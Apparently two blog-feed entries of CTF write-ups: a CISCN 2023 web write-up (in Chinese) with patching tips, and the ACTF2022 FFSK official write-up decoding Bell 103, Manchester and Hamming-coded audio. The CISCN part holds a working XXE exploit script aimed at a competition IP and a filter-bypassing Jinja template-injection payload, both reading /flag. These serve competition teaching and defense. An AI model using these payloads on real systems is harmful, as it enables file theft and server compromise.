      <title>CISCN 2023 Write-Up &amp; Tricks</title>
      <link href="/2023/07/07/CISCN-Write-Up-Tricks/"/>
      <url>/2023/07/07/CISCN-Write-Up-Tricks/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2023-部分-Write-Up-及patch妙妙小技巧"><a href="#CISCN-2023-部分-Write-Up-及patch妙妙小技巧" class="headerlink" title="CISCN 2023 部分 Write-Up 及patch妙妙小技巧"></a>CISCN 2023 部分 Write-Up 及patch妙妙小技巧</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>变量覆盖+XXE外部实体注入任意文件读。<br>Patch：修了extract就行<br>exp:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">file = <span class="string">&quot;/flag&quot;</span></span><br><span class="line">username = <span class="string">&quot;okok20&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;&quot;&quot;<span class="subst">&#123;username&#125;</span>&quot;&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;&quot;&quot;y&quot;&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;user_xml_format&#x27;</span>: <span class="string">f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY content SYSTEM &quot;php://filter/read=convert.base64-encode/resource=<span class="subst">&#123;file&#125;</span>&quot;&gt;]&gt;&lt;userinfo&gt;&lt;user&gt;&lt;username&gt;&amp;content;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;&lt;/userinfo&gt;&quot;&quot;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">&quot;http://175.20.20.196/register.php&quot;</span>,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r = requests.get(<span class="string">f&quot;http://175.20.20.196/login.php?username=<span class="subst">&#123;username&#125;</span>&amp;password=2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h3 id="Ciscn-Search-Engine"><a href="#Ciscn-Search-Engine" class="headerlink" title="Ciscn_Search_Engine"></a>Ciscn_Search_Engine</h3><p>Jinja模板注入，绕过滤字符。我们可以使用request调用get参数来绕过各种字符。   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(request.values.name6)|attr(request.values.name5)()&#125;&#125;</span><br><span class="line">post:</span><br><span class="line">name1=__class__&amp;name2=__base__&amp;name3=__subclasses__&amp;name4=pop&amp;name5=read&amp;name6=&quot;/flag&quot;</span><br></pre></td></tr></table></figure><p>Patch：把花括号干了。  </p><h3 id="其他七七八八的Patch"><a href="#其他七七八八的Patch" class="headerlink" title="其他七七八八的Patch"></a>其他七七八八的Patch</h3><p>首先，我们是可以知道Patch失败的原因的，那么一定要确保不要Patch过猛导致服务异常；我们需要<strong>优先确保服务正常工作，逐步加大Patch力度</strong>。</p><h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p>无脑过滤可以迅速打上Patch！我们可以尽量构造一些正常流量中不太可能出现的字符组合来避免被判服务down掉。<br>比如说，想要过滤Python模板注入，我们可以过滤如下组合：<br><code>|_</code>, <code>._</code>, <code>_c</code>, <code>_[</code>, <code>](</code><br>而对于SQL注入就更简单了：自己打一打，看看哪些函数、符号能利用，就直接过滤掉。  </p><h4 id="类型安全"><a href="#类型安全" class="headerlink" title="类型安全"></a>类型安全</h4><p>如果涉及弱类型的语言，比如PHP，经常会有洞出在弱比较上，那么我们可以考虑如下几种手段：  </p><ul><li>使用强比较：例如PHP&#x2F;Js中使用<code>===</code>而非<code>==</code>；</li><li>在关键参数入口处进行正则化：例如，对于期望是整数的参数<code>iv</code>，就应强制让<code>iv=intval(iv)</code>转为整型；</li></ul><p>相信也可以发现国赛这种patch难度远低于attack的难度。建议<strong>做题的初期当作没有攻击得分，先patch了再说</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write-Up </tag>
            
            <tag> CISCN </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2022 - FFSK - Official WriteUp</title>
      <link href="/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/"/>
      <url>/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/</url>
      
        <content type="html"><![CDATA[<p><del>众所周知歪歪歪英文很烂求轻喷</del>  </p><h2 id="0-Intro"><a href="#0-Intro" class="headerlink" title="0. Intro"></a>0. Intro</h2><p>In the game period, only one team had solved this problem: MapleBacon, a genius team at the University of British Columbia. I’m happy about their praise, but after checking their solution I think what truly “impressive” is their creativity and persistence.</p><p><strong>Strongly recommend reading their awesome solution: <a href="https://maplebacon.org/2022/06/actf-ffsk/">https://maplebacon.org/2022/06/actf-ffsk/</a></strong></p><p>FSK &#x3D; Frequency-shift keying.</p><p>FFSK &#x3D; Double FSK or Fast FSK, whatever.</p><p>This problem is designed to invite participants to have a look at <em>the principle of communication</em>.</p><h2 id="1-Description"><a href="#1-Description" class="headerlink" title="1. Description"></a>1. Description</h2><p>A journey to solve a misc problem always begins from a problem description. Here’s it:</p><blockquote><p>I’ve bought the <strong>second commercial modem</strong> for computers in a big city of the UK.</p><blockquote><p>激情澎湃的球迷迷恋这个地方。遇上球赛季，酒吧里的热情、呐喊、啤酒、摇滚，足球让这个城市充满活力和希望。<br>从三万英尺的云端望去，往日的生活成了一个遥远微小的地图。<br>阳光明媚的日子，开始出发，北京时间00:50 开始起飞，一个梦的距离，就可以到达荷兰阿姆斯特丹，短暂停留之后，然后转机飞往英国<br>南航的飞机配置完备，全程可以充电，还有wifi，影视屏有面前最新的电影。睡睡醒醒，在飞机上觅到一部《北京爱情故事》，让我在三万英尺的空中哭的稀里哗啦。</p></blockquote></blockquote><p>Just Google it, and you’ll realize what it means:</p><ul><li><p><strong>second commercial modem→Bell 103, corresponds with the file name “modem.wav”</strong></p></li><li><p>a big city in the UK: <strong>Manchester</strong>, which refers to the famous coding method.</p></li><li><p>The source of the long Chinese paragraph: <a href="https://kknews.cc/zh-hk/travel/e6yjp34.html">https://kknews.cc/zh-hk/travel/e6yjp34.html</a></p><p>  It describes a trip to Manchester, which is indeed a big city in the UK.</p></li></ul><h2 id="2-Bell-103"><a href="#2-Bell-103" class="headerlink" title="2. Bell 103"></a>2. Bell 103</h2><p>Here’s an article that shows how the Bell 103 protocol works: <a href="https://vigrey.com/blog/emulating-bell-103-modem">https://vigrey.com/blog/emulating-bell-103-modem</a></p><p>So two key points need your attention. First, characters are stored in ASCII code and are <strong>little-endian;</strong> second, it has 2 channels for communication: one for the server-side(2025&#x2F;2225 Hz), and another for the client-side(1070&#x2F;1270 Hz).</p><p>You can also find it from the spectrogram of the .wav file.</p><h2 id="3-Server-channel"><a href="#3-Server-channel" class="headerlink" title="3. Server channel"></a>3. Server channel</h2><p>Using the <code>minimodem</code>tool (See MapleBacon’s write-up) is functional.</p><p>Also, you can find some useful tools in GitHub: <a href="https://github.com/laurenschneider/audiodecoder">https://github.com/laurenschneider/audiodecoder</a></p><p>It may be a faster way. In fact, the <code>solve.py</code> is based on its code.</p><p>After all, you’ll see this on the server channel:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HINT_Hamming@ddddPdddddddPdddPdPP(20).ECCode; Content: Why do you use such</span><br><span class="line">a slow method with a high Bit Error Ratio for communication? It took me a lot of</span><br><span class="line">effort to correct bit-flips, making sure the communication was less</span><br><span class="line">error-prone...that is 2 say, THE ORIGINAL PROTOCOL IS WRAPPED BY SOME OTHER</span><br><span class="line">TRANSFORMATIONS! Fortunately, we can now communicate properly on another channel</span><br><span class="line">while enjoying a vacation in this BIG CITY--I mean, IEEE 802.3.....Wait, what is</span><br><span class="line">the new protocol? Guess by yourself!</span><br></pre></td></tr></table></figure><h2 id="4-Client-channel"><a href="#4-Client-channel" class="headerlink" title="4. Client channel"></a>4. Client channel</h2><p>We can extract the bit string on this channel using the same method but just make some tweaks of frequency. You’ll get a bit string of 53640 bits.</p><p>Notice that the bit string contains only “01” “10”, that is what <strong>Manchester is</strong> all about. The <code>IEEE 802.3</code>mentioned in the server channel message is actually to make sure you decode in the right way: there are 2 opposite ways to map 01&#x2F;10 to 1&#x2F;0, but what is widely used is defined in IEEE 802.3, which says “01”→1 and “10”→0</p><p>Then the key problem is to solve Hamming code. From the given information, you’ll realize the block size is 20bits. Implement it by yourself or just Google&#x2F;GitHub&#x2F;StackOverflow it.</p><p>Find every “1” bit in a block, XOR their <strong>positions</strong>, and magically you got the error bit position(0 if no error) which is a well-designed feature of Hamming code, then just flip the bit.</p><p>Actually, every block has, and only has an error bit: that’s an intended design to notify you that you’re on the right way :)</p><h2 id="5-Final-Step"><a href="#5-Final-Step" class="headerlink" title="5. Final Step"></a>5. Final Step</h2><p>Now you’ve got the cipher bit string: just applied Bell 103 decoder to it once again.</p><p>It’ll yield a string that starts with <code>data:image/png;base64,</code></p><p>An experienced CTFer will immediately put it into the browser (like what MapleBacon did). Or you can find a random online converter to recover this Base64-encoded image. It’s a QR Code. Scan it, and got the flag.</p><h2 id="6-Hints-Explanation"><a href="#6-Hints-Explanation" class="headerlink" title="6. Hints Explanation"></a>6. Hints Explanation</h2><ol><li><p><code>所有人都认为，吃鸡蛋前，原始的方法是打破鸡蛋较大的一端。可是当今皇帝的祖父 时候吃鸡蛋，一次按古法打鸡蛋时碰巧将一个手指弄破了，因此他的父亲，当时的皇帝， 就下了一道敕令，命令全体臣民吃鸡蛋时打破鸡蛋较小的一端，违令者重罚。 老百姓们 对这项命令极为反感。历史告诉我们，由此曾发生过六次叛乱，其中一个皇帝送了命，另 一个丢了王位…关于这一争端，曾出版过几百本大部著作，不过大端派的书一直是受禁的 ，法律也规定该派的任何人不得做官。 ——乔纳森·斯威夫特，《格列佛游记》</code></p><p> It is a quote from Gulliver’s Travels.  Fun fact: this paragraph is <strong>exactly the original source of the 2 words used in modern computer science: “big-endian” &amp; “little-endian”.</strong></p><p> This hint is intended to guide those who are stuck because of their ignorance of the contents(especially the coding method) of the Bell 103 protocol.</p></li><li><p><code>Hamming code block size: 20bits</code></p><p> Noticed that minimodem may yield partly corrupt text and mislead participants. This hint is to make sure they see the hint hidden at the beginning of the service-side channel message.</p></li><li><p><code>Bell 103</code></p><p> For those who ignored the problem description.</p></li></ol><h2 id="6-Script-to-Solve"><a href="#6-Script-to-Solve" class="headerlink" title="6. Script to Solve"></a>6. Script to Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># goertzel.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Module to create a Goertzel filter</span></span><br><span class="line"><span class="string">Original source: https://github.com/laurenschneider/audiodecoder</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Goertzel</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rate, freq</span>):</span><br><span class="line">        self.normalize = <span class="number">0</span></span><br><span class="line">        self.coeffs = <span class="number">0</span></span><br><span class="line">        self.sample_rate = rate</span><br><span class="line">        self.target_freq = freq</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calculate_coeff</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Precompute coefficients needed for filter equation.</span></span><br><span class="line"><span class="string">        Coeff formulas courtesy of Prof. Massey</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        n = <span class="number">160</span></span><br><span class="line"></span><br><span class="line">        w0 = (<span class="number">2</span> * np.pi * self.target_freq) / self.sample_rate</span><br><span class="line">        self.normalize = np.exp(<span class="number">1j</span> * w0 * n)</span><br><span class="line">        self.coeffs = np.array([np.exp((-<span class="number">1j</span>) * w0 * k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">self, samples</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Goertzel filter equation</span></span><br><span class="line"><span class="string">        :param samples: array of samples</span></span><br><span class="line"><span class="string">        :returns: amplitude</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        y = self.normalize * <span class="number">160</span> * np.dot(self.coeffs, samples)</span><br><span class="line">        ampl = np.<span class="built_in">abs</span>(y)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ampl</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># decode.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Decode a wav file using a Goertzel filter.</span></span><br><span class="line"><span class="string">Modified from https://github.com/laurenschneider/audiodecoder</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> goertzel <span class="keyword">import</span> Goertzel</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> wavfile</span><br><span class="line"></span><br><span class="line">DATA = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">filepath = os.path.join(DATA, <span class="string">&quot;filename.wav&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read sample rate and data from audio file</span></span><br><span class="line">rate, data = wavfile.read(filepath)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">bit_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">mark_freq = <span class="number">2225</span></span><br><span class="line">space_freq = <span class="number">2025</span></span><br><span class="line">mark_filter = Goertzel(rate, mark_freq)</span><br><span class="line">space_filter = Goertzel(rate, space_freq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate coefficients for each filter</span></span><br><span class="line">mark_filter.calculate_coeff()</span><br><span class="line">space_filter.calculate_coeff()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data.size + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for each chunk of 160 samples</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">160</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        start = i - <span class="number">160</span></span><br><span class="line">        end = i</span><br><span class="line">        samples = data[start:end]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get amplitutes of sample set</span></span><br><span class="line">        mark_amp = mark_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line">        space_amp = space_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mark_amp &gt; space_amp:</span><br><span class="line">            <span class="comment"># bit is 1</span></span><br><span class="line">            to_add = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># bit is zero</span></span><br><span class="line">            to_add = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        bit_string = to_add + bit_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="built_in">len</span>(bit_string)+<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        start = x - <span class="number">9</span></span><br><span class="line">        end = x - <span class="number">1</span></span><br><span class="line">        message = <span class="built_in">chr</span>(<span class="built_in">int</span>(bit_string[start:end],<span class="number">2</span>)) + message</span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set target frequencies</span></span><br><span class="line">mark_freq = <span class="number">1270</span></span><br><span class="line">space_freq = <span class="number">1070</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create two filters</span></span><br><span class="line">mark_filter = Goertzel(rate, mark_freq)</span><br><span class="line">space_filter = Goertzel(rate, space_freq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate coefficients for each filter</span></span><br><span class="line">mark_filter.calculate_coeff()</span><br><span class="line">space_filter.calculate_coeff()</span><br><span class="line"></span><br><span class="line">bit_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">message = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data.size + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for each chunk of 160 samples</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">160</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        start = i - <span class="number">160</span></span><br><span class="line">        end = i</span><br><span class="line">        samples = data[start:end]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get amplitutes of sample set</span></span><br><span class="line">        mark_amp = mark_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line">        space_amp = space_filter.<span class="built_in">filter</span>(samples)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mark_amp &gt; space_amp:</span><br><span class="line">            to_add = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            to_add = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        bit_string = to_add + bit_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HammingBolck</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(message)==<span class="number">15</span>)</span><br><span class="line">    message=message[::-<span class="number">1</span>]</span><br><span class="line">    code = <span class="number">0</span></span><br><span class="line">    m_pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> (ind+<span class="number">1</span>)&amp;(ind): <span class="comment"># Not parity check bit</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(message[m_pos],<span class="number">2</span>):</span><br><span class="line">                code = code ^ (<span class="number">1</span>&lt;&lt;ind)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b1</span>)&lt;&lt;<span class="number">0</span>)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b10</span>)&lt;&lt;<span class="number">0</span>)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b100</span>)&lt;&lt;<span class="number">1</span>)</span><br><span class="line">                code = code ^ (((ind+<span class="number">1</span>)&amp;<span class="number">0b1000</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">            m_pos = m_pos + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    code = code ^ (<span class="number">1</span>&lt;&lt;random.randint(<span class="number">0</span>,<span class="number">19</span>))</span><br><span class="line"></span><br><span class="line">    retStr = <span class="string">&quot;&#123;0:020b&#125;&quot;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;from &quot;</span>+message+<span class="string">&quot; to &quot;</span>+retStr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HammingBolckInv</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(message)==<span class="number">20</span>)</span><br><span class="line">    code = <span class="built_in">int</span>(message,<span class="number">2</span>)</span><br><span class="line">    wrong = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span>&lt;&lt;ind)&amp;code:</span><br><span class="line">            wrong = wrong ^ (ind+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> wrong:</span><br><span class="line">        code = code ^ (<span class="number">1</span>&lt;&lt;(wrong-<span class="number">1</span>))</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> (ind+<span class="number">1</span>)&amp;(ind): <span class="comment"># Not parity check bit</span></span><br><span class="line">            retStr = retStr + (<span class="string">&quot;1&quot;</span> <span class="keyword">if</span> code&amp;(<span class="number">1</span>&lt;&lt;ind) <span class="keyword">else</span> <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> retStr[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Hamming</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">15</span>):</span><br><span class="line">        retStr = retStr + HammingBolck(message[ind:ind+<span class="number">15</span>])</span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HammingInv</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">20</span>):</span><br><span class="line">        retStr = retStr + HammingBolckInv(message[ind:ind+<span class="number">20</span>])</span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manchester</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        retStr += <span class="string">&quot;01&quot;</span> <span class="keyword">if</span> char==<span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&quot;10&quot;</span></span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manchesterInv</span>(<span class="params">message</span>):</span><br><span class="line">    retStr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">2</span>):</span><br><span class="line">        char = message[ind]</span><br><span class="line">        retStr += <span class="string">&quot;0&quot;</span> <span class="keyword">if</span> char==<span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">return</span> retStr</span><br><span class="line"></span><br><span class="line">bit_string=bit_string[::-<span class="number">1</span>]</span><br><span class="line">bit_string = HammingInv(manchesterInv(bit_string))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="built_in">len</span>(bit_string)+<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        start = x - <span class="number">9</span></span><br><span class="line">        end = x - <span class="number">1</span></span><br><span class="line">        message = <span class="built_in">chr</span>(<span class="built_in">int</span>(bit_string[start:end],<span class="number">2</span>)) + message</span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure><h3 id="7-Final-Words"><a href="#7-Final-Words" class="headerlink" title="7. Final Words"></a>7. Final Words</h3><p>In my eyes, a good misc problem should not be an annoying puzzle. Steps to solve a misc problem have to be reasonable. For example, in this problem, Manchester coding is applied after the application of Hamming coding: that’s because the former is channel coding, and the latter is source coding. We shouldn’t just pick some random encryption and apply it to plaintext.</p><p> I have made my best to make the solving process more natural. I hope you enjoy digging deep into the problem. You’ll earn much more fun than those who can just use tools written by others 